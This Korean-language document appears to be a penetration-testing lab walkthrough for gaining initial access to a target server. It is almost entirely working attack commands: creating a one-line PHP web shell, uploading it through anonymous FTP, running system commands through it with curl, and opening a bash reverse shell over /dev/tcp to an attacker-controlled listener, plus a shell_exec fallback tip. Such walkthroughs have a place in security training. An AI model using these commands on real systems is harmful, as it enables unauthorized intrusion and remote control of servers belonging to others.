### 1\. 웹 셸 준비 및 업로드

이 과정은 **`system()`** 함수를 사용하는 가장 일반적인 웹 셸 **`web.php`** 파일을 서버의 쓰기 가능한 **`/ftp`** 디렉터리에 넣는 단계입니다.

1.  **셸 파일 생성 (Kali):**
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > web.php
    ```
2.  **FTP 접속 (Kali):**
    ```bash
    ftp [Target-IP] 
    # anonymous 로그인
    ```
3.  **디렉터리 이동 및 업로드 (FTP):**
    ```
    ftp> cd ftp
    ftp> put web.php
    ftp> bye
    ```

### 2\. 🔍 작동 확인 및 정보 수집

업로드된 웹 셸을 `curl`로 실행하여 **명령어 실행 권한**을 확인하고 정보를 수집합니다.

1.  **권한 확인:**
    ```bash
    curl http://[Target-IP]/ftp/web.php?cmd=id
    ```
2.  **시스템 커널 정보 확인:**
    ```bash
    curl http://[Target-IP]/ftp/web.php?cmd=uname -a
    ```

### 3\. 🎣 리버스 셸 획득

안정적인 셸을 얻어 초기 침투를 완료합니다.

1.  **리스너 설정 (Kali):**
    ```bash
    nc -lvnp 4444
    ```
2.  **리버스 셸 실행 (웹 셸):**
    ```bash
    curl "http://[Target-IP]/ftp/web.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/[Kali-IP]/4444%200%3E%261"
    ```

> 💡 **우회 팁:** 만약 `system()` 버전이 작동하지 않으면, **`web-shell.php`** 파일(`<?php echo shell_exec($_GET['cmd']); ?>`)을 만들어 다시 업로드하여 시도하세요.